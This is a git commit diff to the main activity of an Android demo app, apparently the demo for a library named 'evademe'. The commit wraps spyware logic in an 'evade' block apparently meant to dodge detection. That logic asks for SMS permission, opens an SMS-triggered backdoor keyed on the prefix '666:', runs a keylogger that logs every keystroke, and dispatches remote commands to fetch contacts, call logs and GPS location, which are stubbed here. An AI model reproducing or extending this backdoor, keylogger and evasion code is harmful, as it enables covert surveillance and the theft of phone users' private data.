d32891bcf99ecedf7c02602b0db957dda7261ce5
evilthreads <evilthreads669966@gmail.com>
2020-10-06 19:29:37 -0500

    forgot to add evade to demo

--- app/src/main/java/com/evilthreads/evademe/MainActivity.kt
+++ app/src/main/java/com/evilthreads/evademe/MainActivity.kt
@@ -34,20 +34,22 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
-            SmsBackdoor.openDoor(this, "666:", payload = {
-                Keylogger.subscribe { entry ->
-                    Log.d("KEYLOGGER", entry.toString())
+        evade {
+            KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
+                SmsBackdoor.openDoor(this, "666:", payload = {
+                    Keylogger.subscribe { entry ->
+                        Log.d("KEYLOGGER", entry.toString())
+                    }
+                }){ remoteCommand ->
+                    when(remoteCommand){
+                        "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
+                        "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
+                        "COMMAND_GET_LOCATION" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION")
+                        else -> Log.d(TAG, "COMMAND NOT FOUND")
+                    }
                 }
-            }){ remoteCommand ->
-                when(remoteCommand){
-                    "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
-                    "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
-                    "COMMAND_GET_LOCATION" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE GPS LOCATION")
-                    else -> Log.d(TAG, "COMMAND NOT FOUND")
-                }
-            }
-            Keylogger.requestPermission(this)
-        }.ask()
+                Keylogger.requestPermission(this)
+            }.ask()
+        }
     }
 }
